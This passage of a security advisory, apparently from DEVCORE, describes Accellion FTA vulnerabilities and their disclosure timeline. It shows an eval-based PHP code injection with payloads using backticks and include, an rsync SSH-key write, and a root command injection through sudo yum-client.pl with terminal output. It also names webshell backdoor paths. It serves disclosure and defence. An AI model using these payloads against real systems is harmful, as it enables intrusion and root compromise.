    <span class="nv">$orig_func</span> <span class="o">=</span> <span class="nv">$func_call</span><span class="p">;</span>
    <span class="nv">$func_call</span> <span class="o">=</span> <span class="nv">$func_match</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
<span class="p">}</span>
<span class="nv">$cs_method</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span> <span class="s1">'delete_session_cache'</span><span class="p">,</span> <span class="s1">'delete_user_contact'</span><span class="p">,</span> <span class="s1">'valid_password'</span><span class="p">,</span> <span class="s1">'user_password_update_disallowed'</span><span class="p">,</span> <span class="s1">'user_password_format_disallowed'</span><span class="p">,</span> <span class="s1">'get_user_contact_list'</span><span class="p">,</span> <span class="s1">'user_email_verified'</span><span class="p">,</span> <span class="s1">'user_exist_allow_direct_download'</span><span class="p">,</span> <span class="s1">'user_profile_auth'</span> <span class="p">);</span>
<span class="k">if</span> <span class="p">((</span> <span class="o">!</span><span class="nv">$func_call</span> <span class="o">||</span> <span class="o">!</span><span class="nb">in_array</span><span class="p">(</span> <span class="nv">$func_call</span><span class="p">,</span> <span class="nv">$cs_method</span> <span class="p">)</span> <span class="p">))</span> <span class="p">{</span>
    <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$orig_func</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$func_call</span> <span class="o">=</span> <span class="nv">$orig_func</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$func_call</span>  <span class="o">==</span> <span class="s1">'get_user_contact_list'</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$_csinfo</span><span class="p">[</span><span class="s1">'user_id'</span><span class="p">])</span> <span class="p">{</span>
        <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span> <span class="s1">'/[\\\/"\*\:\?\&lt;\&gt;\|&amp;]/'</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]</span> <span class="p">))</span> <span class="p">{</span>
        <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nv">$func_call</span> <span class="o">=</span> <span class="s1">'echo(count('</span> <span class="mf">.</span> <span class="nv">$func_call</span> <span class="mf">.</span> <span class="s1">'("'</span> <span class="mf">.</span> <span class="nv">$_csinfo</span><span class="p">[</span><span class="s1">'user_id'</span><span class="p">]</span> <span class="mf">.</span> <span class="s1">'", array("nickname"=&gt;"'</span> <span class="mf">.</span> <span class="nb">addslashes</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]</span> <span class="p">)</span> <span class="mf">.</span> <span class="s1">'"))));'</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'p1'</span><span class="p">]</span> <span class="p">))</span> <span class="p">{</span>
        <span class="nv">$func_param</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>  <span class="p">);</span>
        <span class="nv">$p_no</span> <span class="o">=</span> <span class="mi">7</span><span class="p">;</span>

        <span class="k">while</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'p'</span> <span class="mf">.</span> <span class="nv">$p_no</span><span class="p">]</span> <span class="p">))</span> <span class="p">{</span>
            <span class="nv">$func_param</span><span class="p">[]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span> <span class="s1">'\''</span><span class="p">,</span> <span class="s1">'\\\''</span><span class="p">,</span> <span class="nb">str_replace</span><span class="p">(</span> <span class="s1">'$'</span><span class="p">,</span> <span class="s1">'\\$'</span><span class="p">,</span> <span class="nb">addslashes</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'p'</span> <span class="mf">.</span> <span class="nv">$p_no</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">);</span>
            <span class="o">++</span><span class="nv">$p_no</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="nv">$func_call</span> <span class="o">=</span> <span class="s1">'echo('</span> <span class="mf">.</span> <span class="nv">$func_call</span> <span class="mf">.</span> <span class="s1">'("'</span> <span class="mf">.</span> <span class="nb">join</span><span class="p">(</span> <span class="s1">'", "'</span><span class="p">,</span> <span class="nv">$func_param</span> <span class="p">)</span> <span class="mf">.</span> <span class="s1">'"));'</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">echo</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span> <span class="nv">$func_call</span> <span class="p">);</span></code></pre></figure>

<p>If Known-Secret-Key has been acquired, the output of decrypt( $_POST[fc] ) will be controllable. And despite that the succeeding regular expressions work as a function name whitelist filter, they do not filter parameters.<br />
Therefore, the only restriction for injecting random codes in the parameters is to exclude <code class="language-plaintext highlighter-rouge">(</code> <code class="language-plaintext highlighter-rouge">)</code> in the strings. But thanks to the flexible characteristic of PHP, there are lots of ways to manipulate, just to name two examples here.</p>

<p><br />
Execute system commands directly by using backticks (`)</p>

<blockquote>
  <p>user_profile_auth(`$_POST[cmd]`);
<br /></p>
</blockquote>

<p>A more elegant way: use the syntax INCLUDE to include the tmp_name of the uploaded files, so that any protection will give way.</p>

<blockquote>
  <p>user_profile_auth(include $_FILES[file][tmp_name]);</p>
</blockquote>

<p><br /></p>

<h4 id="local-privilege-escalation-cve-2016-2352-and-cve-2016-2353">Local Privilege Escalation (CVE-2016-2352 and CVE-2016-2353)</h4>
<p>After gaining PHP page privileges, we discovered that the privileges were assigned to user nobody. In order to engage in advanced recon, the web environment had been observed. After the observation, two possible privilege escalation vulnerabilities were identified.</p>

<h5 id="1-incorrect-rsync-configuration">1. Incorrect Rsync Configuration</h5>

<div class="highlight-name">/etc/opt/rsyncd.conf</div>

<figure class="highlight"><pre><code class="language-lighttpd" data-lang="lighttpd">log file = /home/soggycat/log/kennel.log
...
[soggycat]
path = /home/soggycat
uid = soggycat
read only = false
list = false
...</code></pre></figure>

<p>The module name soggycat is readable and writable to anyone for the directory <code class="language-plaintext highlighter-rouge">/home/soggycat/</code>, therefore the SSH Key can be written into <code class="language-plaintext highlighter-rouge">/home/soggycat/.ssh/</code> and then use the soggycat credential to login.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">bash-3.2<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>99<span class="o">(</span>nobody<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>99<span class="o">(</span>nobody<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>99<span class="o">(</span>nobody<span class="o">)</span>

bash-3.2<span class="nv">$ </span>rsync 0::soggycat/.ssh/
drwx------        4096 2016/01/29 18:13:41 <span class="nb">.</span>
<span class="nt">-rw-r--r--</span>         606 2016/01/29 18:13:41 authorized_keys

bash-3.2<span class="nv">$ </span>rsync 0::soggycat/.ssh/authorized_keys <span class="nb">.</span>
bash-3.2<span class="nv">$ </span><span class="nb">cat </span>id_dsa.pub <span class="o">&gt;&gt;</span> authorized_keys
bash-3.2<span class="nv">$ </span>rsync authorized_keys 0::soggycat/.ssh/

bash-3.2<span class="nv">$ </span>ssh <span class="nt">-i</span> id_dsa <span class="nt">-o</span> <span class="nv">UserKnownHostsFile</span><span class="o">=</span>/dev/null <span class="nt">-o</span> <span class="nv">StrictHostKeyChecking</span><span class="o">=</span>no soggycat@localhost <span class="nb">id
</span>Could not create directory <span class="s1">'/.ssh'</span><span class="nb">.</span>
Warning: Permanently added <span class="s1">'0,0.0.0.0'</span> <span class="o">(</span>RSA<span class="o">)</span> to the list of known hosts.
<span class="nv">uid</span><span class="o">=</span>520<span class="o">(</span>soggycat<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>99<span class="o">(</span>nobody<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>99<span class="o">(</span>nobody<span class="o">)</span></code></pre></figure>

<p><br /></p>

<h5 id="2-command-injection-in-yum-clientpl">2. Command Injection in “yum-client.pl”</h5>

<p>To enable system updates through web UI, the sudoers configuration in FTA exceptionally allows the user nobody to directly execute commands with root privileges and update software with the program <code class="language-plaintext highlighter-rouge">yum-client.pl</code>.</p>

<div class="highlight-name">/etc/sudoers</div>

<figure class="highlight"><pre><code class="language-apache" data-lang="apache"><span class="err">...</span>
Cmnd_Alias      YUM_UPGRADE = /usr/bin/yum -y upgrade
Cmnd_Alias      YUM_CLIENT = /usr/local/bin/yum-client.pl
<span class="err">...</span>
<span class="c"># User privilege specification</span>
root     ALL=(ALL) <span class="ss">ALL</span>
admin    <span class="ss">ALL</span> =NOPASSWD: UPDATE_DNS, UPDATE_GW, UPDATE_NTP, RESTART_NETWORK, CHMOD_OLDTEMP ...
nobody   <span class="ss">ALL</span> =NOPASSWD: SSL_SYSTEM, ADMIN_SYSTEM, IPSEC_CMD, YUM_CLIENT
soggycat <span class="ss">ALL</span> =NOPASSWD: ADMIN_SYSTEM, IPSEC_CMD, CHOWN_IPSEC, UPDATE_IPSEC, YUM_CLIENT
radmin   <span class="ss">ALL</span> =NOPASSWD: RESET_APPL
<span class="err">...</span></code></pre></figure>

<p><br /></p>

<p><code class="language-plaintext highlighter-rouge">YUM_CLIENT</code> is the command for proceeding updates. Part of the codes are as follows:</p>

<div class="highlight-name">/usr/local/bin/yum-client.pl</div>

<figure class="highlight"><pre><code class="language-perl" data-lang="perl"><span class="o">...</span>
<span class="nv">GetOptions</span> <span class="p">(</span>
   <span class="p">'</span><span class="s1">help</span><span class="p">'</span> <span class="o">=&gt;</span> <span class="o">\</span><span class="nv">$help</span><span class="p">,</span>
   <span class="p">'</span><span class="s1">download_only</span><span class="p">'</span> <span class="o">=&gt;</span> <span class="o">\</span><span class="nv">$download_only</span><span class="p">,</span>
   <span class="p">'</span><span class="s1">list</span><span class="p">'</span> <span class="o">=&gt;</span> <span class="o">\</span><span class="nv">$list</span><span class="p">,</span>
   <span class="p">'</span><span class="s1">cache</span><span class="p">'</span> <span class="o">=&gt;</span> <span class="o">\</span><span class="nv">$cache</span><span class="p">,</span>
   <span class="p">'</span><span class="s1">clearcache</span><span class="p">'</span> <span class="o">=&gt;</span> <span class="o">\</span><span class="nv">$clearcache</span><span class="p">,</span>
   <span class="p">'</span><span class="s1">cdrom=s</span><span class="p">'</span> <span class="o">=&gt;</span> <span class="o">\</span><span class="nv">$cdrom</span><span class="p">,</span>
   <span class="p">'</span><span class="s1">appid=s</span><span class="p">'</span> <span class="o">=&gt;</span> <span class="o">\</span><span class="nv">$appid</span><span class="p">,</span>
   <span class="p">'</span><span class="s1">servername=s</span><span class="p">'</span> <span class="o">=&gt;</span> <span class="o">\</span><span class="nv">$servername</span><span class="p">,</span>
   <span class="p">'</span><span class="s1">version=s</span><span class="p">'</span> <span class="o">=&gt;</span> <span class="o">\</span><span class="nv">$version</span><span class="p">,</span>
   <span class="p">'</span><span class="s1">token=s</span><span class="p">'</span> <span class="o">=&gt;</span> <span class="o">\</span><span class="nv">$token</span><span class="p">);</span>

<span class="k">my</span> <span class="nv">$YUM_CMD</span> <span class="o">=</span> <span class="p">"</span><span class="s2">/usr/bin/yum</span><span class="p">";</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$cache</span><span class="p">){</span>
  <span class="nv">$YUM_CMD</span> <span class="o">=</span> <span class="p">"</span><span class="si">$YUM_CMD</span><span class="s2"> -C</span><span class="p">";</span>
<span class="p">}</span>

<span class="c1"># if this is based on RHEL 5, change the repository</span>
<span class="k">my</span> <span class="nv">$OS</span> <span class="o">=</span> <span class="p">`</span><span class="sb">grep -q 5 /etc/redhat-release &amp;&amp; echo -n 5</span><span class="p">`;</span>
<span class="k">my</span> <span class="nv">$LOGFILE</span> <span class="o">=</span> <span class="p">"</span><span class="s2">/home/seos/log/yum-client.log</span><span class="p">";</span>
<span class="k">my</span> <span class="nv">$STATUSFILE</span> <span class="o">=</span> <span class="p">"</span><span class="s2">/home/seos/log/yum-client.status</span><span class="p">";</span>
<span class="k">my</span> <span class="nv">$YUMCONFIG</span> <span class="o">=</span> <span class="p">"</span><span class="s2">/etc/yum.conf</span><span class="p">";</span>
<span class="k">my</span> <span class="nv">$YUMDIFF_FILE</span> <span class="o">=</span> <span class="p">'</span><span class="s1">/home/seos/log/yum.diff</span><span class="p">';</span>

<span class="k">if</span> <span class="p">(</span><span class="nv">$cdrom</span><span class="p">){</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$OS</span> <span class="ow">eq</span> <span class="p">"</span><span class="s2">5</span><span class="p">"){</span>
     <span class="nv">$YUM_CMD</span> <span class="o">=</span> <span class="p">"</span><span class="si">$YUM_CMD</span><span class="s2"> -c </span><span class="si">$cdrom_path</span><span class="s2">/yum.conf-5</span><span class="p">";</span>
  <span class="p">}</span><span class="k">else</span><span class="p">{</span>
     <span class="nv">$YUM_CMD</span> <span class="o">=</span> <span class="p">"</span><span class="si">$YUM_CMD</span><span class="s2"> -c </span><span class="si">$cdrom_path</span><span class="s2">/yum.conf</span><span class="p">";</span>
  <span class="p">}</span>
  <span class="nb">system</span><span class="p">("</span><span class="s2">mkdir -p /mnt/cdrom &amp;&amp; mount -o loop </span><span class="si">$cdrom</span><span class="s2"> </span><span class="si">$cdrom_path</span><span class="p">")</span> <span class="o">==</span> <span class="mi">0</span> <span class="ow">or</span> <span class="nv">fdielog</span><span class="p">(</span><span class="nv">$LOGFILE</span><span class="p">,"</span><span class="s2">unable to mount: $!</span><span class="p">");</span>
<span class="p">}</span></code></pre></figure>

<p>After taking a closer look on <code class="language-plaintext highlighter-rouge">ymm-client.pl</code>, a Command Injection vulnerability was found on the parameter <code class="language-plaintext highlighter-rouge">--cdrom</code>. This vulnerability enables attackers to inject any commands into the parameter and execute as root.</p>

<p>Thus, using the commands below</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">bash-3.2<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>99<span class="o">(</span>nobody<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>99<span class="o">(</span>nobody<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>99<span class="o">(</span>nobody<span class="o">)</span>

bash-3.2<span class="nv">$ </span><span class="nb">sudo</span> /usr/local/bin/yum-client.pl <span class="nt">--cdrom</span><span class="o">=</span><span class="s1">'$(id &gt; /tmp/.gg)'</span>

mount: can<span class="s1">'t find /mnt/cdrom in /etc/fstab or /etc/mtab
unable to mount: Bad file descriptor at /usr/local/bin/yum-client.pl line 113.

bash-3.2$ cat /tmp/.gg
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)</span></code></pre></figure>

<p>will grant execution freely as root!<br />
<br /></p>

<h3 id="backdoor">Backdoor</h3>
<p><br />
After gaining the highest privilege and carrying out server recon, we identified that several backdoors had been already planted in FTA hosts. One of them is an IRC Botnet which had been mentioned in Niara’s <a href="http://www.niara.com/docs/ta-accellion-fta-cve-2015-2857.pdf">Accellion File Transfer Appliance Vulnerability</a>.<br />
Apart from that, two additional PHP Webshells of different types which had NEVER been noted in public reports were also identified. Through reviewing Apache Log, these backdoors might be placed by exploiting the CVE-2015-2857 vulnerability discovered in mid-2015.</p>

<p>One of the backdoors is PHPSPY, it is found on 62 of the online hosts globally. It was placed in</p>

<blockquote>
  <p>https://&lt;fta&gt;/courier/themes/templates/Redirector_Cache.php</p>
</blockquote>

<p>The other is WSO, found on 9 of the online hosts globally, placed in</p>

<blockquote>
  <p>https://&lt;fta&gt;/courier/themes/templates/imag.php</p>
</blockquote>

<p><br /></p>

<h3 id="acknowledgement">Acknowledgement</h3>
<p><br />
The vulnerability mentioned in this Advisory was identified in early 2016 while looking for vulnerabilities in Facebook, you can refer to the article “<a href="https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/">How I Hacked Facebook, and Found Someone’s Backdoor Script</a>”.<br />
Upon discovering the FTA vulnerability in early February, I notified Facebook and Accellion and both were very responsive. Accellion responded immediately, issuing patch FTA_9_12_40 on February 12th and notifying all affected customers about the vulnerability and instructions to install the patch. Accellion has been very communicative and cooperative throughout this process.<br />
<br /></p>

<h3 id="timeline">Timeline</h3>

<ul>
  <li>Feb  6, 2016 05:21 Contact Accellion for vulnerability report</li>
  <li>Feb  7, 2016 12:35 Send the report to Accellion Support Team</li>
  <li>Mar  3, 2016 03:03 Accellion Support Team notifies patch will be made in FTA_9_12_40</li>
  <li>May 10, 2016 15:18 Request Advisory submission approval and report the new discovery of two backdoors to Accellion</li>
  <li>Jun  6, 2016 10:20 Advisory finalized by mutual consent</li>
</ul>

<h3 id="references">References</h3>

<ul>
  <li><a href="https://community.rapid7.com/community/metasploit/blog/2015/07/10/r7-2015-08-accellion-file-transfer-appliance-vulnerabilities-cve-2015-2856-cve-2015-2857">R7-2015-08: Accellion File Transfer Appliance Vulnerabilities (CVE-2015-2856, CVE-2015-2857)</a> <a name="ref1"></a></li>
  <li><a href="https://www.rapid7.com/resources/advisories/R7-0039.jsp">Rapid7 Advisory R7-0039: Accellion File Transfer Appliance Multiple Vulnerabilities</a> <a name="ref2"></a></li>
  <li><a href="http://www.niara.com/docs/ta-accellion-fta-cve-2015-2857.pdf">Threat Advisory: Accellion File Transfer Appliance Vulnerability</a> <a name="ref3"></a></li>
</ul>


                    </div>
                    <!-- 文章內容 -->
                </div>
            </article>
            <!-- 文章 end -->
        </section>
        
         <!-- 作者 -->
        <section>
            <div class="container article_footer">
                <div class="author_info">
                    <a href="/en/blog/author/orange">
                        <div class="circle" style="background-image: url(/assets/img/avatar/orig/orange.png);"></div>
                    </a>
                    <div>
                        <a class="author" href="/en/blog/author/orange">
                            <h3>Orange Tsai</h3>
                        </a>
                        <span>Principal Security Researcher</span>
                        <p>
                            I am Orange : )
                        </p>
                    </div>
                </div>
            </div>
        </section>
        

    </div>

    <!-- footer -->
    <footer>
<div class="container footer">
    <div class="logo">
        <a href="/en/">
            <img src="/images/logo.svg"/>
        </a>
        <div class="social">
            <a href="https://www.facebook.com/D3VC0RE"><i class="icon facebook"></i></a>
            <a href="https://twitter.com/d3vc0r3"><i class="icon twitter"></i></a>
        </div>
    </div>

    <div class="column">
        <h6 class="mobile_toggle">Services</h6>
        <ul>
            <li><a href="/en/services/red-team/">Red Team Assessment</a></li>
            <li><a href="/en/services/penetration-test/">Penetration Testing</a></li>
            <li><a href="/en/services/security-consulting/">Security Consulting</a></li>
            <li><a href="/en/services/security-training/">Security Training</a></li>
        </ul>
    </div>

    <div class="column">
        <h6 class="mobile_toggle">Research</h6>
        <ul>
            <li><a href="/en/research/overview/">Overview</a></li>
            <li><a href="/en/research/awards/">Competitions and Awards</a></li>
            <li><a href="/en/research/bug-bounty/">Enterprise Vulnerability Reports</a></li>
            <li><a href="/en/research/talks/">International Conferences</a></li>
            <li><a href="/en/research/cve/">CVE List</a></li>
        </ul>
    </div>

    <div class="column">
        <h6 class="mobile_toggle">Company</h6>
        <ul>
            <li><a href="/en/company/about/">Company Overview</a></li>
            <li><a href="/en/company/our-team/">Team Members</a></li>
            <li><a href="/en/company/history/">Achievements</a></li>
            <li><a href="/en/company/csr/">Corporate Social Responsibility</a></li>
            <li><a href="/en/company/jobs/">Job Opportunities</a></li>
            <li><a href="/en/contact/">Contact</a></li>
        </ul>
    </div>

    <div class="column">
        <h6 class="mobile_toggle">News</h6>
        <ul>
            <li><a href="/en/blog/">Blog</a></li>
            <li><a href="/en/media-kit/">Media Resources</a></li>
        </ul>
    </div>

    <!-- divider 分隔線 -->
    <div class="divider"></div>

    <div class="copyright">
        <div class="info">
            <span>© 2025 DEVCORE <b class="line-block">All rights reserved.</b></span>
            <span><a href="/en/privacy-policy/">Privacy Policy</a></span>
        </div>
        <div class="lang">
            <!-- <i class="icon translate"></i>
            <select>
                <option value="">Language</option>
                <option value="">中文</option>
                <option value="">English</option>
            </select> -->
            <span>Language :<a href="/">中文</a>|<a href="/en/">English</a></span>
        </div>
    </div>

</div>
    </footer>
</body>
</html>










